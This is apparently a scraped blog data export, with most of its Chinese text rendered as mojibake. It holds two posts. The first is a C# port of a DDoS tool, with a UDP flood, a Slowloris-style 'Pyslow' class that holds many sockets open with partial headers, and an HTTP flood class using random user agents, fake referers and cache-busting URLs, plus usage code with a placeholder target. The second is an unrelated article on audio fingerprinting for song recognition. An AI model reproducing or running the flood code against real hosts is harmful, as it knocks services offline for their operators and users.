UDP æ•°æ®åŒ…ã€‚æ•°æ®åŒ…å†…å®¹ä¸ºéšæœºå­—èŠ‚ï¼Œé€šè¿‡ Random.NextBytes() å¡«å……ã€‚è¿›åº¦æ¡æ˜¾ç¤ºï¼š æ¨¡æ‹Ÿäº†æ”»å‡»å¯åŠ¨çš„åŠ è½½è¿›åº¦ï¼Œç±»ä¼¼åŸå§‹ Python ä»£ç ä¸­çš„è¿›åº¦æ¡ã€‚ ç«¯å£é€’å¢é€»è¾‘ï¼šæ¯æ¬¡å‘é€æ•°æ®åŒ…åï¼Œç«¯å£å·åŠ  1ã€‚è¶…è¿‡ 65534 æ—¶ï¼Œé‡ç½®ä¸º 1ã€‚ å‚è€ƒï¼šhttps://github.com/Ha3MrX/DDos-Attack/blob/master/ddos-attack.py TCPå·¥å…·ç±»123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172namespace ConsoleApp1Test&#123; /// &lt;summary&gt; /// dstools /// &lt;/summary&gt; internal class ds &#123; public static List&lt;string&gt; AddBots() &#123; List&lt;string&gt; bots = new List&lt;string&gt;(); bots.Add(&quot;http://www.bing.com/search?q=%40&amp;count=50&amp;first=0&quot;); bots.Add(&quot;http://www.google.com/search?hl=en&amp;num=100&amp;q=intext%3A%40&amp;ie=utf-8&quot;); return bots; &#125; public static List&lt;string&gt; AddUserAgent() &#123; List&lt;string&gt; uagents = new List&lt;string&gt;(); try &#123; string[] lines = [&quot;Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0&quot;, &quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36&quot;, &quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6&quot;, &quot;Mozilla/5.0 (Windows NT 6.2; rv:22.0) Gecko/20130405 Firefox/22.0&quot;]; //System.IO.File.ReadAllLines(&quot;ua.txt&quot;); uagents.AddRange(lines); &#125; catch (FileNotFoundException) &#123; Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine(&quot;[-] No file named &#x27;ua.txt&#x27;,failed to load User-Agents&quot;); Console.ResetColor(); &#125; return uagents; &#125; public static IPAddress CheckTgt(string tgt) &#123; try &#123; IPHostEntry hostEntry = Dns.GetHostEntry(tgt); return hostEntry.AddressList[0]; &#125; catch (Exception) &#123; Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine($&quot;[-] Can&#x27;t resolve host:Unknown host!&quot;); Console.ResetColor(); Environment.Exit(1); &#125; return null; &#125; public static string FakeIP() &#123; Random random = new Random(); string[] ips = new string[4]; for (int i = 0; i &lt; 4; i++) &#123; int num = random.Next(0, 256); if (num == 127) &#123; i--; continue; &#125; ips[i] = num.ToString(); &#125; return string.Join(&quot;.&quot;, ips); &#125; &#125;&#125; ç½‘ç»œæ•°æ®ç±»123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157namespace ConsoleApp1Test&#123; public class Pyslow &#123; private string tgt; private int port; private float to; private int threads; private int sleep; private string[] method = &#123; &quot;GET&quot;, &quot;POST&quot; &#125;; private int pkt_count; public Pyslow(string tgt, int port, float to, int threads, int sleep) &#123; this.tgt = tgt; this.port = port; this.to = to; this.threads = threads; this.sleep = sleep; &#125; public byte[] MyPkt() &#123; Random random = new Random(); string text = method[random.Next(0, method.Length)] + &quot; /&quot; + random.Next(1, 999999999).ToString() + &quot; HTTP/1.1\\r\\n&quot; + &quot;Host:&quot; + tgt + &quot;\\r\\n&quot; + &quot;User-Agent:&quot; +ds. AddUserAgent()[random.Next(0, ds.AddUserAgent().Count)] + &quot;\\r\\n&quot; + &quot;Content-Length: 42\\r\\n&quot;; return Encoding.ASCII.GetBytes(text); &#125; public Socket BuildingSocket() &#123; Socket sock = null; try &#123; sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); pkt_count += 3; if (sock.Connected) &#123; sock.Send(MyPkt()); pkt_count += 1; &#125; &#125; catch (Exception) &#123; sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, -1); pkt_count += 3; if (sock.Connected) &#123; sock.Send(MyPkt()); pkt_count += 1; &#125; &#125; return sock; &#125; public void SendingPackets() &#123; Socket sock = null; try &#123; sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); pkt_count += 3; if (sock.Connected) &#123; byte[] data = Encoding.ASCII.GetBytes(&quot;X-a: b\\r\\n&quot;); sock.Send(data); pkt_count += 1; &#125; &#125; catch (Exception) &#123; sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, (int)to * 1000); sock.Connect(new IPEndPoint(IPAddress.Parse(tgt), port)); sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, -1); if (sock.Connected) &#123; byte[] data = Encoding.ASCII.GetBytes(&quot;X-a: b\\r\\n&quot;); sock.Send(data); pkt_count += 1; &#125; &#125; &#125; public void DoConnection() &#123; int socks = 0; int fail = 0; List&lt;Socket&gt; lsocks = new List&lt;Socket&gt;(); Console.ForegroundColor = ConsoleColor.Blue; Console.WriteLine(&quot;\\t\\tBuilding sockets&quot;); Console.ResetColor(); while (socks &lt; threads) &#123; try &#123; Socket sock = BuildingSocket(); if (sock != null) &#123; lsocks.Add(sock); socks++; if (socks &gt; threads) &#123; break; &#125; &#125; &#125; catch (Exception) &#123; fail++; &#125; &#125; Console.ForegroundColor = ConsoleColor.Blue; Console.WriteLine(&quot;\\t\\tSending packets&quot;); Console.ResetColor(); while (socks &lt; threads) &#123; try &#123; SendingPackets(); socks++; if (socks &gt; threads) &#123; break; &#125; &#125; catch (Exception) &#123; fail++; &#125; &#125; Console.ForegroundColor = ConsoleColor.Green; Console.Write(&quot;I have sent &quot;); Console.ForegroundColor = ConsoleColor.Cyan; Console.Write(pkt_count.ToString()); Console.ForegroundColor = ConsoleColor.Green; Console.Write(&quot; packets successfully.Now i&#x27;m going to sleep for &quot;); Console.ForegroundColor = ConsoleColor.Red; Console.Write(sleep.ToString()); Console.ForegroundColor = ConsoleColor.Green; Console.WriteLine(&quot; second&quot;); Thread.Sleep(sleep * 1000); &#125; &#125;&#125; httpç±»123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113public class Requester&#123; private string tgt; private int port; private bool ssl; private List&lt;HttpWebRequest&gt; req = new List&lt;HttpWebRequest&gt;(); public Requester(string tgt) &#123; this.tgt = tgt; Uri url = new Uri(tgt); if (url.Scheme == &quot;https&quot;) &#123; ssl = true; port = 443; &#125; else &#123; ssl = false; port = 80; &#125; &#125; public Dictionary&lt;string, string&gt; Header2() &#123; Random random = new Random(); List&lt;string&gt; cachetype = new List&lt;string&gt; &#123; &quot;no-cache&quot;, &quot;no-store&quot;, &quot;max-age=&quot; + random.Next(0, 10).ToString(), &quot;max-stale=&quot; + random.Next(0, 100).ToString(), &quot;min-fresh=&quot; + random.Next(0, 10).ToString(), &quot;notransform&quot;, &quot;only-if-cache&quot; &#125;; List&lt;string&gt; acceptEc = new List&lt;string&gt; &#123; &quot;compress,gzip&quot;, &quot;&quot;, &quot;*&quot;, &quot;compress;q=0,5, gzip;q=1.0&quot;, &quot;gzip;q=1.0, indentity; q=0.5, *;q=0&quot; &#125;; List&lt;string&gt; acceptC = new List&lt;string&gt; &#123; &quot;ISO-8859-1&quot;, &quot;utf-8&quot;, &quot;Windows-1251&quot;, &quot;ISO-8859-2&quot;, &quot;ISO-8859-15&quot; &#125;; List&lt;string&gt; bot = ds.AddBots(); string c = cachetype[random.Next(0, cachetype.Count)]; string a = acceptEc[random.Next(0, acceptEc.Count)]; Dictionary&lt;string, string&gt; http_header = new Dictionary&lt;string, string&gt;(); http_header.Add(&quot;User-Agent&quot;, ds.AddUserAgent()[random.Next(0, ds.AddUserAgent().Count)]); http_header.Add(&quot;Cache-Control&quot;, c); http_header.Add(&quot;Accept-Encoding&quot;, a); http_header.Add(&quot;Keep-Alive&quot;, &quot;42&quot;); http_header.Add(&quot;Host&quot;, tgt); http_header.Add(&quot;Referer&quot;, bot[random.Next(0, bot.Count)]); return http_header; &#125; public WebHeaderCollection Header() &#123; Random random = new Random(); List&lt;string&gt; cachetype = new List&lt;string&gt; &#123; &quot;no-cache&quot;, &quot;no-store&quot;, &quot;max-age=&quot; + random.Next(0, 10).ToString(), &quot;max-stale=&quot; + random.Next(0, 100).ToString(), &quot;min-fresh=&quot; + random.Next(0, 10).ToString(), &quot;notransform&quot;, &quot;only-if-cache&quot; &#125;; List&lt;string&gt; acceptEc = new List&lt;string&gt; &#123; &quot;compress,gzip&quot;, &quot;&quot;, &quot;*&quot;, &quot;compress;q=0,5, gzip;q=1.0&quot;, &quot;gzip;q=1.0, indentity; q=0.5, *;q=0&quot; &#125;; List&lt;string&gt; acceptC = new List&lt;string&gt; &#123; &quot;ISO-8859-1&quot;, &quot;utf-8&quot;, &quot;Windows-1251&quot;, &quot;ISO-8859-2&quot;, &quot;ISO-8859-15&quot; &#125;; List&lt;string&gt; bot = ds.AddBots(); string c = cachetype[random.Next(0, cachetype.Count)]; string a = acceptEc[random.Next(0, acceptEc.Count)]; WebHeaderCollection http_header = new WebHeaderCollection(); http_header.Add(&quot;User-Agent&quot;, ds.AddUserAgent()[random.Next(0, ds.AddUserAgent().Count)]); http_header.Add(&quot;Cache-Control&quot;, c); http_header.Add(&quot;Accept-Encoding&quot;, a); http_header.Add(&quot;Keep-Alive&quot;, &quot;42&quot;); http_header.Add(&quot;Host&quot;, tgt); http_header.Add(&quot;Referer&quot;, bot[random.Next(0, bot.Count)]); return http_header; &#125; public string RandStr() &#123; Random random = new Random(); List&lt;string&gt; mystr = new List&lt;string&gt;(); for (int x = 0; x &lt; 3; x++) &#123; const string chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;; string text = new string(Enumerable.Repeat(chars, random.Next(7, 14)).Select(s =&gt; s[random.Next(s.Length)]).ToArray()); mystr.Add(text); &#125; return string.Join(&quot;&amp;&quot;, mystr); &#125; public string CreateUrl() &#123; return tgt + &quot;?&quot; + RandStr(); &#125; public void Run(string method,int count=1) &#123; try &#123; foreach (var _ in Enumerable.Range(0, count)) // å¯ä»¥æ ¹æ®å®é™…éœ€æ±‚è°ƒæ•´å¾ªç¯æ¬¡æ•°ç­‰é€»è¾‘ï¼Œè¿™é‡Œç®€å•ç¤ºä¾‹å…ˆå¾ªç¯1æ¬¡ &#123; //string method = new string[] &#123; &quot;GET&quot;, &quot;POST&quot; &#125;[new Random().Next(0, 2)]; // å…ˆåˆ›å»ºåŒ…å«å®Œæ•´è¯·æ±‚URLï¼ˆåŒ…å«å‚æ•°ç­‰ï¼‰çš„Uriå¯¹è±¡ Uri requestUri = new Uri(CreateUrl()); HttpWebRequest reqter; if (ssl) &#123; reqter = (HttpWebRequest)WebRequest.Create(requestUri); &#125; else &#123; reqter = (HttpWebRequest)WebRequest.Create(requestUri); &#125; reqter.Method = method; using (WebResponse response = reqter.GetResponse()) &#123; // å¯ä»¥åœ¨è¿™é‡Œæ·»åŠ å¯¹å“åº”å†…å®¹çš„å¤„ç†é€»è¾‘ï¼Œå½“å‰ä¸ºç©º Console.WriteLine(response.ContentLength.ToString()); &#125; &#125; &#125; catch (Exception e) &#123; Console.WriteLine(e.Message); &#125; &#125; &#125; ä½¿ç”¨12345678910111213141516171819202122232425262728293031 string target = &quot;xxx&quot;;// æ›¿æ¢ä¸ºå®é™…ç›®æ ‡IPæˆ–åŸŸå int port = xxx; float timeout = 5.0f; int threads = 10; int sleepTime = 100; Pyslow pyslow = new Pyslow(target, port, timeout, threads, sleepTime); try &#123; pyslow.DoConnection(); &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;å‘ç”Ÿå¼‚å¸¸: &#123;ex.Message&#125;&quot;); &#125;//// åˆ›å»ºRequesterç±»çš„å®ä¾‹ï¼Œä¼ å…¥ç›®æ ‡URL//Requester requester = new Requester(&quot;http://xxx/index.html&quot;); // http://xxx:16552//try//&#123;// // è°ƒç”¨Runæ–¹æ³•æ¥æ‰§è¡Œå‘é€è¯·æ±‚ç­‰ç›¸å…³æ“ä½œ// requester.Run(&quot;GET&quot;, 100);//POST//&#125;//catch (Exception ex)//&#123;// Console.WriteLine($&quot;å‘ç”Ÿå¼‚å¸¸: &#123;ex.Message&#125;&quot;);//&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"csharp","slug":"csharp","permalink":"https://banjinmei.github.io/tags/csharp/"}],"author":"mu"},{"title":"å¬æ­Œè¯†æ›²","slug":"å¬æ­Œè¯†æ›²","date":"2024-12-10T14:33:56.000Z","updated":"2024-12-13T17:50:26.588Z","comments":true,"path":"2024/12/10/å¬æ­Œè¯†æ›²/","permalink":"https://banjinmei.github.io/2024/12/10/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2/","excerpt":"","text":"å¬æ­Œè¯†æ›²æŠ–éŸ³å°è§†é¢‘èƒŒæ™¯éŸ³ä¹è¯†åˆ« å‰è¨€ç°ä»£è¯­è¨€ç³»ä¸­è¯­éŸ³çš„ç‰¹å¾æ˜¯æŒ‡æè¿°è¯­éŸ³çš„æ ¸å¿ƒä¿¡æ¯ï¼Œè¿™åœ¨è¯­éŸ³æ¨¡å‹çš„æ„å»ºä¸­èµ·é‡è¦ä½œç”¨ã€‚äººç±»é€šè¿‡è€³æœµå¬åˆ°çš„ç‰¹æœ‰çš„é¢‘ç‡ç»„æˆçš„åºåˆ—æ¥è®°å¿†æ­Œæ›²ï¼Œé’ˆå¯¹äºçŸ­è§†é¢‘ä¸­çš„èƒŒæ™¯éŸ³ä¹ï¼Œé€šè¿‡å‚…é‡Œå¶å˜æ¢å°†å£°éŸ³è½¬æ¢ä¸ºé¢‘ç‡ï¼Œå¾—åˆ°ä¸€ä¸ªä¸ªæ•°ç»„ï¼Œå†ç”±æ•°ç»„ç»„åˆæˆå£°éŸ³æŒ‡çº¹ï¼Œä»è€Œè¿›è¡ŒéŸ³ä¹çš„è¯†åˆ«ã€‚ 1.èƒŒæ™¯æ­Œåè¯†åˆ«äº§ç”ŸèƒŒæ™¯è§£å†³æ–¹æ¡ˆ-è¯­éŸ³å¤„ç†æŠ€æœ¯è¯­éŸ³ä¿¡å·å¤„ç†(Speech Signal Processing)ç®€ç§°è¯­éŸ³å¤„ç†ï¼Œæ˜¯ç”¨ä»¥ç ”ç©¶è¯­éŸ³å‘å£°è¿‡ç¨‹ã€è¯­éŸ³ä¿¡å·ç»Ÿè®¡ç‰¹æ€§ã€è¯­éŸ³è‡ªåŠ¨è¯†åˆ«ã€æœºå™¨åˆæˆä»¥åŠè¯­éŸ³æ„ŸçŸ¥ç­‰å„ç§å¤„ç†æŠ€æœ¯çš„æ€»ç§°ã€‚ç”±äºç°ä»£çš„è¯­éŸ³å¤„ç†æŠ€æœ¯éƒ½ä»¥æ•°å­—è®¡ç®—ä¸ºåŸºç¡€ï¼Œå¹¶å€ŸåŠ©å¾®å¤„ç†å™¨ã€ä¿¡å·å¤„ç†å™¨æˆ–é€šç”¨è®¡ç®—æœºåŠ ä»¥å®ç°ï¼Œå› æ­¤ä¹Ÿç§°æ•°å­—è¯­éŸ³ä¿¡å·å¤„ç†ã€‚ 2.è¯­éŸ³å¤„ç†æŠ€æœ¯æ¦‚è¿°ä»€ä¹ˆæ˜¯è¯­éŸ³å¤„ç†è¯­éŸ³ä¿¡å·å¤„ç†çš„ç ”ç©¶èµ·æºäºå¯¹å‘éŸ³å™¨å®˜çš„æ¨¡æ‹Ÿã€‚1939å¹´ç¾å›½H.æœå¾·è±(H.Dudley)å±•å‡ºäº†ä¸€ä¸ªç®€å•çš„å‘éŸ³è¿‡ç¨‹æ¨¡æ‹Ÿç³»ç»Ÿï¼Œä»¥åå‘å±•ä¸ºå£°é“çš„æ•°å­—æ¨¡å‹ã€‚åˆ©ç”¨è¯¥æ¨¡å‹å¯ä»¥å¯¹è¯­éŸ³ä¿¡å·è¿›è¡Œå„ç§é¢‘è°±åŠå‚æ•°çš„åˆ†æï¼Œè¿›è¡Œé€šä¿¡ç¼–ç æˆ–æ•°æ®å‹ç¼©çš„ç ”ç©¶ï¼ŒåŒæ—¶ä¹Ÿå¯åŸºäºæ­¤åˆæˆè¯­éŸ³ä¿¡å·ï¼Œå®ç°æœºå™¨çš„è¯­éŸ³åˆæˆã€‚è¯­è¨€ä¿¡æ¯ä¸»è¦åŒ…å«åœ¨è¯­éŸ³ä¿¡å·çš„å‚æ•°ä¹‹ä¸­ï¼Œå› æ­¤å‡†ç¡®è€Œè¿…é€Ÿåœ°æå–è¯­è¨€ä¿¡å·çš„å‚æ•°æ˜¯è¿›è¡Œè¯­éŸ³ä¿¡å·å¤„ç†çš„å…³é”®ã€‚ è¯­éŸ³å¤„ç†-å£°çº¹è¯†åˆ«å£°çº¹(Voiceprint)ï¼Œä¹Ÿå¯ç§°ä½œè¯´è¯äººè¯†åˆ«ï¼Œæ˜¯ä¸€ç§é€šè¿‡å£°éŸ³åˆ¤åˆ«è¯´è¯äººèº«ä»½çš„æŠ€æœ¯ï¼Œå£°çº¹æ˜¯æºå¸¦è¨€è¯­ä¿¡æ¯çš„å£°æ³¢é¢‘è°±ï¼Œç”±æ³¢é•¿ã€é¢‘ç‡ä»¥åŠå¼ºåº¦ç­‰å¤šç§ç‰¹å¾ç»´åº¦ç»„æˆçš„ç”Ÿç‰©ç‰¹å¾ï¼Œæœ‰ç¨³å®šæ€§ï¼Œå¯æµ‹é‡æ€§ä»¥åŠå”¯ä¸€æ€§ç­‰ä¼˜ç‚¹ã€‚ä¸åŒçš„äººè¯´è¯æ‰€äº§ç”Ÿçš„å£°çº¹å›¾è°±æ˜¯å­˜åœ¨å·®å¼‚çš„ï¼Œé€šè¿‡å¯¹æ¯”å·®å¼‚å°±å¯å®ç°å£°çº¹è¯†åˆ«çš„åŠŸèƒ½ã€‚ å£°çº¹è¯†åˆ«ç‰¹å¾å…±é¸£æ–¹å¼ç‰¹å¾å’½è…”å…±é¸£ã€é¼»è…”å…±é¸£å’Œå£è…”å…±é¸£ å—“éŸ³çº¯åº¦ç‰¹å¾ä¸åŒäººçš„å™ªéŸ³ï¼Œçº¯åº¦ä¸€èˆ¬æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¤§è‡´å¯åˆ†ä¸ºé«˜çº¯åº¦(æ˜äº®)ã€ä½çº¯åº¦(æ²™å“‘)å’Œä¸­ç­‰çº¯åº¦ä¸‰ä¸ªç­‰çº§ å¹³å‡éŸ³é«˜ç‰¹å¾å¹³å‡éŸ³é«˜çš„é«˜ä½:å—“éŸ³é«˜äº¢è¿˜æ˜¯ä½æ²‰ éŸ³åŸŸç‰¹å¾éŸ³åŸŸçš„é«˜ä½:å£°éŸ³é¥±æ»¡è¿˜æ˜¯å¹²ç˜ª å£°çº¹è¯†åˆ«æµç¨‹å£°çº¹è¯†åˆ«ä½œä¸ºç”Ÿç‰©è¯†åˆ«çš„ä¸€ç§ï¼Œä¹Ÿå¯ç§°ä¸ºè¯´è¯äººè¯†åˆ«ï¼Œä»è¯´è¯äººå‘å‡ºçš„è¯­éŸ³ä¿¡å·ä¸­æå–å£°çº¹ç‰¹å¾ä¿¡æ¯ã€‚é€šå¸¸å…·æœ‰ä¸¤ä¸ªé˜¶æ®µï¼Œå³å£°éŸ³æ³¨å†Œå’Œå£°éŸ³éªŒè¯ã€‚ å£°çº¹æ³¨å†Œ-&gt;æœ‰æ•ˆè¯­éŸ³æå–-&gt;æå–ç‰¹å¾-&gt;å£°çº¹æ•°æ®åº“&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;â†‘ &emsp;&emsp;&emsp;â”‚&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;æå–ç®—æ³•&emsp;å¯¹æ¯”ç®—æ³•&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; &emsp;â†“ &emsp;&emsp;&emsp;â†“å£°çº¹éªŒè¯-&gt;æœ‰æ•ˆè¯­éŸ³æå–-&gt;æå–ç‰¹å¾-&gt;ç‰¹å¾å¯¹æ¯”-&gt;è¯†åˆ«ç»“æœ 3.èƒŒæ™¯æ­Œåè¯†åˆ«æ‰€æ¶‰åŠç›¸å…³æŠ€æœ¯ç‰¹å¾æå–å£°çº¹è¯†åˆ«ä¸­é‡è¦çš„ä¸€æ­¥ä¸ºç‰¹å¾æå–ï¼Œå³è¯†åˆ«éŸ³é¢‘ä¿¡å·ï¼Œè·å–æ‰€éœ€è¯­éŸ³ä¿¡æ¯ å®ç°1.è¯­éŸ³ä¿¡å·åˆ†å¸§éŸ³é¢‘ä¿¡å·ä¸æ–­å˜åŒ–ï¼Œä¸ºäº†ç®€åŒ–å¤„ç†æ­¥éª¤ï¼Œå°†éŸ³é¢‘ä¿¡å·åˆ†å¸§å¤„ç†(å¸¸åˆ†ä¸º20~40mså¸§)ç¡®ä¿æ¯å¸§çš„éŸ³é¢‘ä¿¡å·å˜åŒ–ç¨³å®š 2.å¯¹æ¯å¸§åšå‚…é‡Œå¶å˜æ¢å‚…é‡Œå¶å˜æ¢é€‚ç”¨äºåˆ†å¿ƒå¹³ç¨³çš„éŸ³é¢‘ä¿¡å·ï¼Œå‚…é‡Œå¶å˜æ¢å¯¹é’ˆå¯¹æ¯ä¸€å¸§éŸ³é¢‘ä¿¡å·è¿›è¡Œå¤„ç†ï¼Œåªè®°å½•ä¸æ¥è¿‘äºé›¶çš„é¢‘åŸŸä¿¡æ¯ï¼Œä»è€Œå‡å°‘æ•°æ®é‡ æ—¶åŸŸæè¿°æ•°å­¦å‡½æ•°æˆ–ç‰©ç†ä¿¡å·å¯¹æ—¶é—´çš„å…³ç³»ï¼Œé€šå¸¸å‘ˆç°ä¸ºæ³¢å½¢é¢‘åŸŸåœ¨å¯¹å‡½æ•°æˆ–ä¿¡å·è¿›è¡Œåˆ†ææ—¶ï¼Œåˆ†æå…¶å’Œé¢‘ç‡æœ‰å…³çš„éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯å’Œæ—¶é—´çš„æœ‰å…³éƒ¨åˆ†ï¼Œä¸æ—¶åŸŸç›¸å¯¹ï¼Œé€šå¸¸å‘ˆç°ä¸ºé¢‘è°± å‚…é‡Œå¶å˜æ¢å‚…é‡Œå¶å˜æ¢:ä½œä¸ºä¸€ç§çº¿æ€§ç§¯åˆ†å˜æ¢ï¼Œå¯ç”¨äºéŸ³é¢‘ä¿¡å·åœ¨æ—¶åŸŸå’Œé¢‘åŸŸä¹‹é—´çš„è½¬æ¢ã€‚å…¶å®è´¨ä¸º:å°†æ—¶åŸŸä¿¡å·å˜æ¢ä¸ºé¢‘åŸŸä¿¡å·ï¼Œå°†ç¹æ‚çš„æ•°æ®ç®€åŒ–ï¼Œä»…éœ€è¦å¯¹å°‘éƒ¨åˆ†æ•°æ®è¿›è¡Œå¤„ç†ã€‚(ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨å¯¹ä¿¡å·åšå‚…é‡Œå¶å˜æ¢æ—¶ï¼Œåªéœ€è¦è®°å½•å…¶ä¸­ä¸æ¥è¿‘é›¶çš„é¢‘åŸŸä¿¡æ¯å³å¯ï¼Œè¿™æ ·åšå°±ä½¿å¾—æ•°æ®é‡å¤§å¤§å‡å°‘)é’ˆå¯¹éŸ³é¢‘æ•°æ®è¿›è¡Œå‚…é‡Œå¶å˜æ¢åï¼Œå¯¹æ•°æ®è¿›è¡Œæ±‚æ¨¡ï¼Œå¾—åˆ°å¤šç»„æ•°ç»„ï¼Œå¯¹æ•°ç»„è¿›è¡Œæ•´åˆ(ä¾‹:å°†å››ä¸ªæ•°ç»„ä¸­æ¨¡é•¿æœ€é•¿çš„ä¸‹æ ‡è¿›è¡Œåˆå¹¶ï¼Œåˆæˆä¸€ä¸ªå››å…ƒç»„)ï¼Œä»è€Œè·å¾—æ ¸å¿ƒçš„éŸ³é¢‘â€œæŒ‡çº¹â€ã€‚ åŒ¹é…å£°çº¹æ•°æ®åº“åœ¨å¯¹å£°éŸ³è¿›è¡Œæ³¨å†Œåï¼Œé€šè¿‡æå–è¯­éŸ³ç‰¹å¾ï¼Œè·å¾—å£°çº¹å¯¼å…¥æ•°æ®åº“ä¸­å»ºç«‹å¯¹åº”çš„å£°çº¹æ•°æ®åº“å½“è·å–åˆ°è¯­éŸ³æ–‡ä»¶ä¹‹åï¼Œé€šè¿‡é¢„å¤„ç†è·å–åˆ°è¯­éŸ³ç‰¹å¾ï¼Œç»è¿‡ä¸å£°çº¹æ•°æ®è¿›è¡Œç‰¹å¾å¯¹æ¯”ï¼Œä»è€Œå¾—åˆ°æœ€ä½³çš„è¯†åˆ«ç»“æœã€‚ å£°çº¹è¯†åˆ«åº”ç”¨å®‰é˜²ä½œä¸ºç”Ÿç‰©ç‰¹å¾è¯†åˆ«æŠ€æœ¯ï¼Œå¯ä»¥ç”¨äºåˆ‘ä¾¦ã€é‰´å®šè¯†åˆ«ç­‰é¢†åŸŸé‡‘èé€šè¿‡å£°çº¹æŠ€æœ¯æä¾›ç”¨æˆ·æ³¨å†Œã€ç”¨æˆ·éªŒè¯ç­‰åŠŸèƒ½ç¤¾ä¿é€šè¿‡å£°çº¹æŠ€æœ¯å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½è®¤è¯ï¼Œç¡®ä¿å‚ä¿äººå‘˜ç”Ÿå­˜çŠ¶å†µæ™ºèƒ½ç¡¬ä»¶é€šè¿‡å£°çº¹è¯†åˆ«æŠ€æœ¯ï¼Œå®ç°â€œå¬å£°è¯†äººâ€ï¼Œè®©æ™ºèƒ½ç¡¬ä»¶èƒ½å¤ŸåŒºåˆ†ä¸åŒçš„è§’è‰² 4. èƒŒæ™¯æ­Œåè¯†åˆ«å®è·µæ­Œåè¯†åˆ« æ¶æ„python + äº‘æ•°æ®åº“RDS py3Pymysql (py2 mysqldb)Moviepy è½¬éŸ³é¢‘PyAudio è¯­éŸ³æ“ä½œ å…³ç³»å‹æ•°æ®åº“ç³»å‹æ•°æ®åº“(Relational Database Serviceï¼Œç®€ç§°RDS)æ˜¯ä¸€ç§åŸºäºäº‘è®¡ç®—å¹³å°çš„å³å¼€å³ç”¨ã€ç¨³å®šå¯é ã€å¼¹æ€§ä¼¸ç¼©ã€ä¾¿æ·ç®¡ç†çš„åœ¨çº¿å…³ç³»å‹æ•°æ®åº“æœåŠ¡ã€‚ äº‘å…³ç³»å‹æ•°æ®åº“å¯æ”¯æŒä»¥ä¸‹å‡ ç±»æ•°æ®åº“å¼•æ“:MySQLï¼ŒPostgreSQLï¼ŒSQL Serverï¼ŒGaussDB(openGauss)ç‰¹ç‚¹ä¼˜åŠ¿ å¼€ç®±å³ç”¨ï¼ŒæŒ‰éœ€ä»˜è´¹ï¼Œå¯è§†ç®¡ç†ï¼Œå¼¹æ€§ä¼¸ç¼© å»ºç«‹å£°çº¹æ•°æ®åº“å­˜å‚¨æµ·é‡å£°çº¹æ•°æ®ï¼Œå»ºç«‹å£°çº¹æ•°æ®åº“é€šè¿‡ä¸Pythonè¿æ¥ï¼Œåœ¨Pythoné€šè¿‡ç»„ä»¶åŠä»£ç è·å–åˆ°å¯ç”¨äºå­˜å‚¨çš„å£°çº¹ç‰¹å¾ä¹‹åï¼Œå­˜å…¥æ•°æ®åº“RDSå¯¹åº”æ–°å»ºåº“singdbä¸­ 